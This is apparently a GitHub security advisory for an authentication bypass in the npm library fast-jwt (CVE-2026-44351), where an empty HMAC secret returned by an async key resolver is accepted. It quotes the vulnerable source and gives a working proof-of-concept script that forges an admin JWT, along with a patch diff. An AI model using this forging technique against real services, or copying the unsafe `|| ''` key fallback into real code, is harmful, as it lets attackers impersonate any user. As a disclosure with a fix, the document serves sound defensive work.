# [C] fast-jwt: JWT auth bypass due to empty HMAC secret accepted by async key resolver

## Summary
Severity: Critical
Advisory: GHSA-gmvf-9v4p-v8jc
CVE: CVE-2026-44351
CWE: CWE-1391, CWE-287, CWE-326
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-05-06
Source: https://github.com/advisories/GHSA-gmvf-9v4p-v8jc
Type: github-advisory

## Affected
- npm: `fast-jwt` — affected >=0 <6.2.4

## Details
### Summary

A critical authentication-bypass vulnerability in `fast-jwt`'s async key-resolver flow allows any unauthenticated attacker to forge arbitrary JWTs that are accepted as authentic. When the application's key resolver returns an empty string (`''`), for example via the common `keys[decoded.header.kid] || ''` JWKS-style fallback, fast-jwt converts it to a zero-length `Buffer`, hands it to `crypto.createSecretKey`, derives `allowedAlgorithms = ['HS256','HS384','HS512']` from it, and then verifies the token's signature against an empty-key HMAC. The attacker simply computes `HMAC-SHA256(key='', input='${header}.${payload}')`, which Node accepts without complaint — and the verifier returns the attacker-chosen payload (sub, admin, scopes, etc.) as authentic. Reproducible 100% against the current latest release `fast-jwt@6.2.3`.

### Preconditions

For this issue to occur the following MUST ALL be true:

1. The application developer (library consumer) uses an asynchronous callback function to set the key (e.g. `createVerifier({key: async (decoded) => ... })`)
2. The response from the async callback MUST return an empty string `''` OR zero-length buffer (e.g. `Buffer.alloc(0)`). Any other empty/missing return values (e.g. null, undefined) do not trigger this issue
3. The library configuration must allow HMAC signatures. This is the default for the library.
4. The bad actor MUST have signed their token with an empty string. This is a trivial task and requires no special knowledge.
5. All other aspects of the token (e.g. EXP, IAT claims) MUST be valid. This issue ONLY affects signature checking and all other checks remain enforced.


### Details

`src/verifier.js` `prepareKeyOrSecret` (lines 33-39):

```js
function prepareKeyOrSecret(key, isSecret) {
  if (typeof key === 'string') {
    key = Buffer.from(key, 'utf-8')
  }
  return isSecret ? createSecretKey(key) : createPublicKey(key)   // ← no length check
}
```

`src/verifier.js` async key-resolver flow (lines 429-468):

```js
getAsyncKey(key, { header, payload, signature }, (err, currentKey) => {
  ...
  if (typeof currentKey === 'string') {
    currentKey = Buffer.from(currentKey, 'utf-8')   // '' → Buffer.alloc(0)
  } else if (!(currentKey instanceof Buffer)) {
    return callback(... 'string or buffer'...)
  }

  try {
    const availableAlgorithms = detectPublicKeyAlgorithms(currentKey)
    // detectPublicKeyAlgorithms('') hits the `!publicKeyPemMatch && !X509`
    // branch → returns hsAlgorithms = ['HS256','HS384','HS512']

    if (validationContext.allowedAlgorithms.length) {
      checkAreCompatibleAlgorithms(allowedAlgorithms, availableAlgorithms)
    } else {
      validationContext.allowedAlgorithms = availableAlgorithms   // default empty → HMAC family assigned
    }

    currentKey = prepareKeyOrSecret(currentKey, availableAlgorithms[0] === hsAlgorithms[0])
    // → createSecretKey(Buffer.alloc(0)) — Node accepts the empty secret silently
    verifyToken(currentKey, decoded, validationContext)
  }
})
```

`src/crypto.js` `verifySignature` (lines 286-291):

```js
if (type === 'HS') {
  try {
    return timingSafeEqual(createHmac(alg, key).update(input).digest(), signature)
  } catch { return false }
}
```

`crypto.createHmac('sha256', emptyKey)` works. The HMAC of `${header}.${payload}` is fully attacker-computable. `timingSafeEqual` returns true. The verifier returns the attacker's payload as authentic.

The bug exists *only* on the function-typed key resolver path. The synchronous `key: '' | undefined | null` configuration is correctly rejected at `createVerifier` setup because `if (key && keyType !== 'function')` short-circuits on falsy keys, and `verify` then throws `MISSING_KEY` when a token with a signature arrives. In contrast, the async-resolver path **does** allow `''` to flow through.

### PoC

```js
// package.json: { "type": "module" }
// npm i fast-jwt
import { createVerifier } from 'fast-jwt'
import * as crypto from 'node:crypto'

function b64url(buf) {
  return Buffer.from(buf).toString('base64')
    .replace(/=+$/, '').replace(/\+/g, '-').replace(/\//g, '_')
}

// Forge a JWT signed with HMAC-SHA256 over an EMPTY key.
const header = b64url(JSON.stringify({ alg: 'HS256', typ: 'JWT', kid: 'unknown-kid' }))
const payload = b64url(JSON.stringify({
  sub: 'attacker', admin: true,
  iat: Math.floor(Date.now() / 1000),
  exp: Math.floor(Date.now() / 1000) + 60
}))
const input = `${header}.${payload}`
const signature = b64url(crypto.createHmac('sha256', '').update(input).digest())
const forgedToken = `${input}.${signature}`

// Realistic JWKS-style verifier - looks up kid in a key map and falls back
// to '' when the kid is unknown (a widely-used JS idiom).
const verifier = createVerifier({
  key: async (decoded) => ({ 'real-kid': '<real key>' }[decoded.header.kid] || '')
})

console.log(await verifier(forgedToken))
```

Output on `fast-jwt@6.2.3`:

```
{ sub: 'attacker', admin: true, iat: 1777372426, exp: 1777372486 }
```

— the attacker-chosen payload is returned as authentic.

Attack matrix verified against `fast-jwt@6.2.3`:

| Resolver shape | `algorithms` option | HS256 | HS384 | HS512 |
|---|---|---|---|---|
| `async () => ''` | (default) | ✅ accept | ✅ accept | ✅ accept |
| `(d, cb) => cb(null, '')` | (default) | ✅ accept | ✅ accept | ✅ accept |
| `async d => keys[d.header.kid] \|\| ''` | (default) | ✅ accept | ✅ accept | ✅ accept |
| `async () => ''` | `['HS256','HS384','HS512']` | ✅ accept | ✅ accept | ✅ accept |
| `async () => ''` | `['HS256','RS256']` | ✅ accept | INVALID_ALG | INVALID_ALG |
| `async () => ''` | `['RS256']` | INVALID_KEY | INVALID_KEY | INVALID_KEY |

The bug is *only* not triggered when the caller has explicitly restricted `algorithms` to a family incompatible with the empty key's detected `hsAlgorithms`.

Sense checks (also verified against `fast-jwt@6.2.3` to rule out my harness):

- A token signed with the *real* secret continues to verify correctly. → ACCEPTED.
- A forged-empty-key token sent to a verifier whose resolver returns the *real* secret is rejected. → INVALID_SIGNATURE.
- The synchronous `key: ''` (string) configuration is correctly rejected. → MISSING_KEY.

### Impact

Who is impacted: every Node.js application that uses fast-jwt with a function-typed `key` resolver, the standard JWKS pattern fast-jwt's own README documents, *and* whose resolver can ever return `''` or a zero-length `Buffer` (for unknown kid, missing env var, DB miss, exhausted cache, etc.). The trigger pattern `keys[decoded.header.kid] || ''` is widely used in JS code and AI-generated examples.

Concrete attacker capabilities:

1. **Mint arbitrary JWTs** with attacker-chosen `sub`, `admin`, `roles`, `scopes`, `iss`, `aud`, etc.
2. **Full identity assumption** — any application that trusts JWT claims for authorisation grants the attacker whatever role they put in the token.
3. **Default-config exploitable** — the caller does not need to misconfigure `algorithms`. With the default empty array, fast-jwt itself assigns `['HS256','HS384','HS512']` when it sees an empty key.
4. **Cache amplification** — once a forged token is accepted, fast-jwt caches the verification result (default cache size 1000). Subsequent requests skip verification entirely; even a later runtime fix to the resolver would not invalidate the cached forgery within its TTL.

The trigger is unauthenticated, network-reachable, and trivially scriptable, the forged token is just three base64url segments concatenated with dots.

### Suggested fix

Reject zero-length HMAC secrets in `prepareKeyOrSecret`:

```diff
 function prepareKeyOrSecret(key, isSecret) {
   if (typeof key === 'string') {
     key = Buffer.from(key, 'utf-8')
   }
+
+  if (isSecret && (!key || key.length === 0)) {
+    throw new TokenError(TokenError.codes.invalidKey, 'HMAC secret key must not be empty.')
+  }
+
   return isSecret ? createSecretKey(key) : createPublicKey(key)
 }
```

This patch in-place was verified against the same PoC and against the full attack matrix: every one of the 18 vulnerable cells now rejects with `FAST_JWT_INVALID_KEY`, while valid-token verification, valid-secret verification, and the synchronous `key: ''` rejection path are unaffected.

For defence in depth, the maintainer may also want to enforce RFC 2104's recommended minimum HMAC key length (≥ output size of the hash, 32 bytes for HS256, 48 for HS384, 64 for HS512), gated behind a `strictMode` flag if backwards compatibility with shorter-but-valid secrets is needed. The empty-key check above is the minimum fix that closes the auth-bypass primitive.

## References
- https://github.com/nearform/fast-jwt/security/advisories/GHSA-gmvf-9v4p-v8jc
- https://nvd.nist.gov/vuln/detail/CVE-2026-44351
- https://github.com/nearform/fast-jwt
